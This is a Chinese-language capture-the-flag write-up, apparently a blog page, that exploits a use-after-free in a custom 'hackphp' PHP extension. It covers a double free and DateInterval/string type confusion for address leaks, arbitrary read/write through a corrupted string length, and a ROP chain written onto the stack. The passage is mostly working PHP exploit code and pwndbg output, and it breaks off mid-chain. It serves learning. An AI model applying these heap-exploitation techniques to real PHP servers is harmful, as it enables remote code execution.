+<p>hackphp_edit函数接收一个字符串参数，并将其内容写入到buf里，这里注意的是，php里传入的字符串，即使其字符串中存在<code>\x00</code>，其length也不是以该字符截断的，该字符串对象的length成员表示其内容的<code>字节数</code>，并且在hackphp_edit函数中，使用了<code>memcpy</code>而不是<code>strncpy</code>这意味着hackphp_edit不会因为字符串中存在<code>\0</code>而截断，因此，我们可以用该函数进行字节编辑。<br><img src="https://p5.ssl.qhimg.com/t01189b268a3272c7ce.jpg"></p>
+<p>hackphp_get函数用于显示<code>buf</code>的内容，由于使用的是<code>zend_strpprintf(0LL,&quot;%s&quot;, buf)</code>因此会受到<code>\0</code>字符的截断。<br><img src="https://p3.ssl.qhimg.com/t01de87c0d3247a7b79.jpg"></p>
+<p>漏洞分析完了，该模块存在一个UAF，但是由于使用的是<code>emalloc/efree</code>不能像glibc的<code>ptmalloc</code>那样进行花式利用，我们可以利用<code>double free</code>，因为通过测试，<code>double free</code>不会报错，并且重新申请两次时都可以申请到此处，因此我们可以考虑让两个php对象同时占位于此，达到<code>类型混淆</code>的目的。</p>
+<h3 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h3><p>我们可以将<code>DateInterval</code>对象占位于此。为了确定该对象的结构大小，我们使用如下代码测试，其中<code>$str = fread(STDIN,1000);</code>起到阻塞的效果。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = fread(STDIN,1000);</span><br><span class="line">$dv = new DateInterval(&#x27;P1Y&#x27;);</span><br><span class="line">$str = fread(STDIN,1000);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>运行该程序<code>php 1.php</code>,然后另外开一个窗口，用gdb进行attach调试。给emalloc函数下断点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b _emalloc</span><br><span class="line">Breakpoint 1 at 0x55ea1e726970: file /home/sea/Desktop/php-src/Zend/zend_alloc.c, line 2533.</span><br></pre></td></tr></table></figure>
+<p>然后继续运行,程序断下后，发现此时size为<code>56</code><br><img src="https://p3.ssl.qhimg.com/t012d4505e30f4d7232.jpg"><br>继续运行，发现不止一次下断，我们记录下每一次下断后emalloc返回的地址，最终发现第一次<code>emalloc(56)</code>的堆里有许多有用的数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x7f5e332551c0 —▸ 0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 ◂— ...</span><br><span class="line">*RBX  0x7f5e332551c0 —▸ 0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 ◂— ...</span><br><span class="line"> RCX  0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 —▸ 0x7f5e332552d8 ◂— ...</span><br><span class="line"> RDX  0x7f5e33200070 —▸ 0x7f5e332010c0 —▸ 0x7f5e332010d8 —▸ 0x7f5e332010f0 —▸ 0x7f5e33201108 ◂— ...</span><br><span class="line"> RDI  0x7f5e33200040 ◂— 0x0</span><br><span class="line">*RSI  0x5654177dbf50 ◂— 0x1</span><br><span class="line"> R8   0x7f5e33254440 ◂— 0x600000001</span><br><span class="line"> R9   0x7f5e33200000 —▸ 0x7f5e33200040 ◂— 0x0</span><br><span class="line"> R10  0x7f000</span><br><span class="line"> R11  0x246</span><br><span class="line">*R12  0x7f5e332551d0 ◂— 0x0</span><br><span class="line"> R13  0x0</span><br><span class="line"> R14  0x7f5e33212020 —▸ 0x7f5e3328d0c0 —▸ 0x56541558b9fc (execute_ex+8732) ◂— endbr64 </span><br><span class="line"> R15  0x7f5e3328d0c0 —▸ 0x56541558b9fc (execute_ex+8732) ◂— endbr64 </span><br><span class="line"> RBP  0x5654177dbf50 ◂— 0x1</span><br><span class="line">*RSP  0x7ffe15719fd0 —▸ 0x7f5e332120c0 ◂— 0x747468203b0a2e79 (&#x27;y.\n; htt&#x27;)</span><br><span class="line">*RIP  0x5654152b6512 (date_object_new_interval+66) ◂— movups xmmword ptr [rax], xmm0</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x5654152b64fc &lt;date_object_new_interval+44&gt;    pxor   xmm0, xmm0</span><br><span class="line">   0x5654152b6500 &lt;date_object_new_interval+48&gt;    mov    rsi, rbp</span><br><span class="line">   0x5654152b6503 &lt;date_object_new_interval+51&gt;    mov    qword ptr [rax + 0x30], 0</span><br><span class="line">   0x5654152b650b &lt;date_object_new_interval+59&gt;    lea    r12, [rax + 0x10]</span><br><span class="line">   0x5654152b650f &lt;date_object_new_interval+63&gt;    mov    rbx, rax</span><br><span class="line"> ► 0x5654152b6512 &lt;date_object_new_interval+66&gt;    movups xmmword ptr [rax], xmm0</span><br><span class="line">   0x5654152b6515 &lt;date_object_new_interval+69&gt;    mov    rdi, r12</span><br><span class="line">   0x5654152b6518 &lt;date_object_new_interval+72&gt;    movups xmmword ptr [rax + 0x10], xmm0</span><br><span class="line">   0x5654152b651c &lt;date_object_new_interval+76&gt;    movups xmmword ptr [rax + 0x20], xmm0</span><br><span class="line">   0x5654152b6520 &lt;date_object_new_interval+80&gt;    call   zend_object_std_init &lt;zend_object_std_init&gt;</span><br><span class="line"> </span><br><span class="line">   0x5654152b6525 &lt;date_object_new_interval+85&gt;    mov    rsi, rbp</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────────────────</span><br><span class="line">In file: /home/sea/Desktop/php-src/Zend/zend_objects_API.h</span><br><span class="line">   89  * Properties MUST be initialized using object_properties_init(). */</span><br><span class="line">   90 static zend_always_inline void *zend_object_alloc(size_t obj_size, zend_class_entry *ce) &#123;</span><br><span class="line">   91 	void *obj = emalloc(obj_size + zend_object_properties_size(ce));</span><br><span class="line">   92 	/* Subtraction of sizeof(zval) is necessary, because zend_object_properties_size() may be</span><br><span class="line">   93 	 * -sizeof(zval), if the object has no properties. */</span><br><span class="line"> ► 94 	memset(obj, 0, obj_size - sizeof(zval));</span><br><span class="line">   95 	return obj;</span><br><span class="line">   96 &#125;</span><br><span class="line">   97 </span><br><span class="line">   98 static inline zend_property_info *zend_get_property_info_for_slot(zend_object *obj, zval *slot)</span><br><span class="line">   99 &#123;</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7ffe15719fd0 —▸ 0x7f5e332120c0 ◂— 0x747468203b0a2e79 (&#x27;y.\n; htt&#x27;)</span><br><span class="line">01:0008│      0x7ffe15719fd8 —▸ 0x5654177dbf50 ◂— 0x1</span><br><span class="line">02:0010│      0x7ffe15719fe0 —▸ 0x7f5e33212120 ◂— 0x6f20676f4c20746e (&#x27;nt Log o&#x27;)</span><br><span class="line">03:0018│      0x7ffe15719fe8 —▸ 0x56541550c9a9 (object_init_ex+57) ◂— mov    dword ptr [rbx + 8], 0x308</span><br><span class="line">04:0020│      0x7ffe15719ff0 ◂— 0x0</span><br><span class="line">05:0028│      0x7ffe15719ff8 —▸ 0x7f5e33212190 ◂— 0x206f74203b0a6465 (&#x27;ed\n; to &#x27;)</span><br><span class="line">06:0030│      0x7ffe1571a000 —▸ 0x7f5e332120c0 ◂— 0x747468203b0a2e79 (&#x27;y.\n; htt&#x27;)</span><br><span class="line">07:0038│      0x7ffe1571a008 —▸ 0x7f5e33212120 ◂— 0x6f20676f4c20746e (&#x27;nt Log o&#x27;)</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0     5654152b6512 date_object_new_interval+66</span><br><span class="line">   f 1     5654152b6512 date_object_new_interval+66</span><br><span class="line">   f 2     56541550c9a9 object_init_ex+57</span><br><span class="line">   f 3     56541550c9a9 object_init_ex+57</span><br><span class="line">   f 4     56541556f585 ZEND_NEW_SPEC_CONST_UNUSED_HANDLER+53</span><br><span class="line">   f 5     56541558ba05 execute_ex+8741</span><br><span class="line">   f 6     5654155932bd zend_execute+301</span><br><span class="line">   f 7     56541550ac3c zend_execute_scripts+204</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure>
+<p>如上，<code>0x7f5e332551c0</code>为<code>emalloc(56)</code>申请的堆，我们记下该地址，然后输入<code>c</code>继续运行，直到程序不再下断，也就是执行到php代码里的最后一句<code>$str = fread(STDIN,1000);</code>时，此时<code>DateInterval</code>对象创建完成，我们查看该地址处的内容。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tel 0x7f5e332551c0</span><br><span class="line">00:0000│   0x7f5e332551c0 —▸ 0x7f5e3327e000 ◂— 0x1</span><br><span class="line">01:0008│   0x7f5e332551c8 ◂— 0x1</span><br><span class="line">02:0010│   0x7f5e332551d0 ◂— 0xc000041800000001</span><br><span class="line">03:0018│   0x7f5e332551d8 ◂— 0x1</span><br><span class="line">04:0020│   0x7f5e332551e0 —▸ 0x5654177dbf50 ◂— 0x1</span><br><span class="line">05:0028│   0x7f5e332551e8 —▸ 0x56541607a0a0 (date_object_handlers_interval) ◂— 0x10</span><br><span class="line">06:0030│   0x7f5e332551f0 ◂— 0x0</span><br><span class="line">07:0038│   0x7f5e332551f8 —▸ 0x7f5e33255230 —▸ 0x7f5e33255268 —▸ 0x7f5e332552a0 —▸ 0x7f5e332552d8 ◂— ...</span><br><span class="line">pwndbg&gt; tel 0x56541607a0a0</span><br><span class="line">00:0000│   0x56541607a0a0 (date_object_handlers_interval) ◂— 0x10</span><br><span class="line">01:0008│   0x56541607a0a8 (date_object_handlers_interval+8) —▸ 0x5654152b5790 (date_object_free_storage_interval) ◂— endbr64 </span><br><span class="line">02:0010│   0x56541607a0b0 (date_object_handlers_interval+16) —▸ 0x56541553be40 (zend_objects_destroy_object) ◂— endbr64 </span><br><span class="line">03:0018│   0x56541607a0b8 (date_object_handlers_interval+24) —▸ 0x5654152b6550 (date_object_clone_interval) ◂— endbr64 </span><br><span class="line">04:0020│   0x56541607a0c0 (date_object_handlers_interval+32) —▸ 0x5654152b5aa0 (date_interval_read_property) ◂— endbr64 </span><br><span class="line">05:0028│   0x56541607a0c8 (date_object_handlers_interval+40) —▸ 0x5654152b5e50 (date_interval_write_property) ◂— endbr64 </span><br><span class="line">06:0030│   0x56541607a0d0 (date_object_handlers_interval+48) —▸ 0x56541553cba0 (zend_std_read_dimension) ◂— endbr64 </span><br><span class="line">07:0038│   0x56541607a0d8 (date_object_handlers_interval+56) —▸ 0x56541553ce70 (zend_std_write_dimension) ◂— endbr64 </span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure>
+<p>可以发现该对象内部存在一个虚表，虚表里有许多函数指针，因此，我们可以利用某些方法将这些数据读取出来，进而实现了地址泄露。假设我们将该对象占位于<code>hackphp</code>模块中的UAF堆里，用<code>hackphp_get</code>实现不了泄露，因为该函数遇到<code>\0</code>会截断。因此我们可以考虑在之前先构造一个<code>double free</code>然后将<code>DateInterval</code>对象占位于此以后，将另外一个对象也占位于此，并且另外一个对象应该能够使用运算符<code>[]</code>，这样我们可以使用运算符<code>[]</code>来读取数据。一个可以考虑的对象是通过<code>str_repeat(&quot;a&quot;,n);</code>创建的字符串对象，至于不直接使用<code>array</code>是因为<code>array</code>对象有些复杂，而字符串对象相对来说要简单一些。首先，我们得确定<code>n</code>为多少，才能让其大小为<code>56</code>与<code>DateInterval</code>对象保持一致。<br>首先尝试<code>0x30</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = fread(STDIN,1000);</span><br><span class="line">$dv = str_repeat(&quot;a&quot;,0x30); </span><br><span class="line">$str = fread(STDIN,1000);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>仍然使用gdb进行调试，发现实际调用<code>emalloc</code>时，size为0x50<br><img src="https://p3.ssl.qhimg.com/t01cee9793991bbc75f.jpg"><br>因此，如果我们要控制字符串对象的大小为56的话，n应该为0x18，也就是这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str = str_repeat(&quot;a&quot;,0x18);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x7fe101a551c0 —▸ 0x7fe101a551f8 —▸ 0x7fe101a55230 —▸ 0x7fe101a55268 —▸ 0x7fe101a552a0 ◂— ...</span><br><span class="line"></span><br><span class="line">In file: /home/sea/Desktop/php-src/Zend/zend_string.h</span><br><span class="line">   141 </span><br><span class="line">   142 static zend_always_inline zend_string *zend_string_safe_alloc(size_t n, size_t m, size_t l, int persistent)</span><br><span class="line">   143 &#123;</span><br><span class="line">   144 	zend_string *ret = (zend_string *)safe_pemalloc(n, m, ZEND_MM_ALIGNED_SIZE(_ZSTR_STRUCT_SIZE(l)), persistent);</span><br><span class="line">   145 </span><br><span class="line"> ► 146 	GC_SET_REFCOUNT(ret, 1);</span><br><span class="line">   147 	GC_TYPE_INFO(ret) = IS_STRING | ((persistent ? IS_STR_PERSISTENT : 0) &lt;&lt; GC_FLAGS_SHIFT);</span><br><span class="line">   148 	ZSTR_H(ret) = 0;</span><br><span class="line">   149 	ZSTR_LEN(ret) = (n * m) + l;</span><br><span class="line">   150 	return ret;</span><br><span class="line">   151 &#125;</span><br></pre></td></tr></table></figure>
+<p>记下其地址<code>0x7fe101a551c0</code>，然后继续运行，直到不再下断。<br><img src="https://p2.ssl.qhimg.com/t013a669d46ab37e228.jpg"><br>可以发现，字符串对象结构比较简单，0x18偏移处就是数据区长度，如果我们将其篡改，就可以实现越界读写。假设该对象也占位与<code>hackphp</code>模块的UAF堆中，那么我们就能利用该字符串对象对<code>DateInterval</code>对象内部的数据进行读写。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>于是，我们的php脚本这样写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//double free</span><br><span class="line">hackphp_create(56);</span><br><span class="line">hackphp_delete();</span><br><span class="line"></span><br><span class="line">//$x and $dv now has same address</span><br><span class="line">$x = str_repeat(&quot;D&quot;,0x18);</span><br><span class="line">$dv = new DateInterval(&#x27;P1Y&#x27;);</span><br><span class="line"></span><br><span class="line">$dv_vtable_addr = u64($x[0x10] . $x[0x11] . $x[0x12] . $x[0x13] . $x[0x14] . $x[0x15] . $x[0x16] . $x[0x17]);</span><br><span class="line">echo sprintf(&quot;dv_vatble=0x%lx&quot;,$dv_vtable_addr);</span><br><span class="line">echo  &quot;\n&quot;;</span><br><span class="line">$dv_self_obj_addr = u64($x[0x20] . $x[0x21] . $x[0x22] . $x[0x23] . $x[0x24] . $x[0x25] . $x[0x26] . $x[0x27]) - 0x70;</span><br><span class="line">echo sprintf(&quot;dv_self_obj_addr=0x%lx&quot;,$dv_self_obj_addr);</span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure>
+<p>通过上面的脚本，我们已经得到<code>vtable</code>的地址以及该对象自身的地址。接下来，我们重新创建一个堆，然后将一个新的字符串对象占位，通过UAF修改字符串的length成员，从而该字符串对象将具有任意地址读写的能力。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">hackphp_create(0x60);</span><br><span class="line">$oob = str_repeat(&quot;D&quot;,0x40);</span><br><span class="line">hackphp_edit(&quot;\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff/readflag\x00&quot;);</span><br><span class="line">$oob_self_obj_addr = u64($oob[0x48] . $oob[0x49] . $oob[0x4a] . $oob[0x4b] . $oob[0x4c] . $oob[0x4d] . $oob[0x4e] . $oob[0x4f]) - 0xC0;</span><br><span class="line">echo sprintf(&quot;oob_self_obj_addr=0x%lx&quot;,$oob_self_obj_addr);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">$offset = $dv_vtable_addr + 0x8 - ($oob_self_obj_addr + 0x18);</span><br><span class="line">function read64($oob,$addr) &#123;</span><br><span class="line">   /*if ($addr &lt; 0) &#123;</span><br><span class="line">      $addr = 0x10000000000000000 + $addr;</span><br><span class="line">   &#125;*/</span><br><span class="line">   return u64($oob[$addr+0x0] . $oob[$addr+0x1] . $oob[$addr+0x2] . $oob[$addr+0x3] . $oob[$addr+0x4] . $oob[$addr+0x5] . $oob[$addr+0x6] . $oob[$addr+0x7]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo sprintf(&quot;offset=0x%lx&quot;,$offset);</span><br></pre></td></tr></table></figure>
+<p>接下来，就可以泄露虚表里的函数指针地址了，计算出php二进制程序的基址，然后泄露GOT表，计算libc地址，获得gadgets及一些函数的地址。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$date_object_free_storage_interval_addr = read64($oob,$offset+1);</span><br><span class="line">echo sprintf(&quot;date_object_free_storage_interval_addr=0x%lx&quot;,$date_object_free_storage_interval_addr);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">$php_base = $date_object_free_storage_interval_addr - 0x23D790;</span><br><span class="line">$strlen_got = $php_base + 0xFFEEB8;</span><br><span class="line"></span><br><span class="line">$offset = $strlen_got - ($oob_self_obj_addr + 0x18) + 1;</span><br><span class="line">$strlen_addr = read64($oob,$offset);</span><br><span class="line">$libc_base = $strlen_addr - 0x18b660;</span><br><span class="line">$pop_rdi = $libc_base + 0x0000000000026b72;</span><br><span class="line">$pop_rsi = $libc_base + 0x0000000000026b70;</span><br><span class="line">$pop_rdx = $libc_base + 0x0000000000162866;</span><br><span class="line"></span><br><span class="line">$stack_ptr = $libc_base + 0x1ec440;</span><br><span class="line"></span><br><span class="line">$offset = $stack_ptr - ($oob_self_obj_addr + 0x18);</span><br><span class="line">$stack_addr = read64($oob,$offset);</span><br><span class="line">$mprotect_addr = $libc_base + 0x11BB00;</span><br><span class="line"></span><br><span class="line">echo sprintf(&quot;strlen_addr=0x%lx \n&quot;,$strlen_addr);</span><br><span class="line">echo sprintf(&quot;libc_base=0x%lx \n&quot;,$libc_base);</span><br><span class="line">echo sprintf(&quot;stack_addr=0x%lx \n&quot;,$stack_addr);</span><br></pre></td></tr></table></figure>
+<p>接下来就是如何劫持程序流了，由于具有了任意地址读写的能力，那么利用手法就是仁者见仁智者见智了。<br>然而当你调用<code>$oob[x]</code>进行写时，如果<code>x&lt;=0</code>会发现报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">found!PHP Warning:  Illegal string offset:  0 in /home/sea/Desktop/1.php on line 155</span><br><span class="line"></span><br><span class="line">Warning: Illegal string offset:  0 in /home/sea/Desktop/1.php on line 155</span><br></pre></td></tr></table></figure>
+<p>通过分析源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">static zend_never_inline void zend_assign_to_string_offset(zval *str, zval *dim, zval *value, zval *result)</span><br><span class="line">&#123;</span><br><span class="line">	zend_string *old_str;</span><br><span class="line">	zend_uchar c;</span><br><span class="line">	size_t string_len;</span><br><span class="line">	zend_long offset;</span><br><span class="line"></span><br><span class="line">	if (UNEXPECTED(Z_TYPE_P(dim) != IS_LONG)) &#123;</span><br><span class="line">		offset = zend_check_string_offset(dim/*, BP_VAR_W*/);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		offset = Z_LVAL_P(dim);</span><br><span class="line">	&#125;</span><br><span class="line">	if (offset &lt; -(zend_long)Z_STRLEN_P(str)) &#123;</span><br><span class="line">		/* Error on negative offset */</span><br><span class="line">		zend_error(E_WARNING, &quot;Illegal string offset &quot; ZEND_LONG_FMT, offset);</span><br><span class="line">		if (result) &#123;</span><br><span class="line">			ZVAL_NULL(result);</span><br><span class="line">		&#125;</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p>关键一句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (offset &lt; -(zend_long)Z_STRLEN_P(str))</span><br></pre></td></tr></table></figure>
+<p>因为这里，我们<code>length</code>修改为了<code>-1</code>，所以<code>Z_STRLEN_P(str)</code>返回的就是<code>-1</code>取反后就是1，也就是offset必须大于等于1，这意味着，我们只能向后进行任意地址写，当然，可以通过再次修改length为正数，绕过这个if检查。但是我没有这么做，因为栈地址位于最后，所以我可以直接向后找到栈地址，然后劫持栈。</p>
+<p>为了确定栈ROP的位置，我使用了栈内存搜索，知道搜索到一个指定的返回地址结束。因为<code>php_execute_script</code>是执行php脚本的具体实现，所以，我们只需劫持该函数的返回地址，那么我们就需要在栈里搜索该地址，如果找到，就说明这个位置就是我们写ROP的地方了。<br><img src="https://p1.ssl.qhimg.com/t018d7d058399e2bbc7.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ret_main_target = $php_base + 0x51d402;</span><br><span class="line">//搜索ROP的地址</span><br><span class="line">while (true) &#123;</span><br><span class="line">   $data = read64($oob,$offset);</span><br><span class="line">   //echo sprintf(&quot;0x%lx&quot;,$hackphp_so_addr &amp; 0xFFF);</span><br><span class="line">   //echo &quot;\n&quot;;</span><br><span class="line">   if (intval($data) == intval($ret_main_target) ) &#123;</span><br><span class="line">      echo &quot;found!&quot;;</span><br><span class="line">      break;</span><br><span class="line">   &#125;</span><br><span class="line">   $offset--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后就是写入ROP了，不知道为何，不能封装为函数，否则会写入失败。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($pop_rsi &amp; 0xFF);</span><br><span class="line">   $pop_rsi = $pop_rsi &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$offset += 0x8;</span><br><span class="line">$data = 0x1000;</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($data &amp; 0xFF);</span><br><span class="line">   $data = $data &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$offset += 0x10;</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($pop_rdx &amp; 0xFF);</span><br><span class="line">   $pop_rdx = $pop_rdx &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$offset += 0x8;</span><br><span class="line">$data = 0x7;</span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($data &amp; 0xFF);</span><br><span class="line">   $data = $data &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line">$offset += 0x10;</span><br><span class="line"></span><br><span class="line">for ($j=0;$j&lt;8;$j++) &#123;</span><br><span class="line">   $oob[$offset+$j] = chr($pop_rdi &amp; 0xFF);</span><br><span class="line">   $pop_rdi = $pop_rdi &gt;&gt; 0x8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$offset += 8;</span><br><span class="line">$stack_addr = $offset + ($oob_self_obj_addr + 0x18);</span><br><span class="line"></span><br><span class="line">$data = $stack_addr ^ ($stack_addr &amp; 0xfff);</span><br><span class="line">for ($j=0;$j&lt;8;$j++) 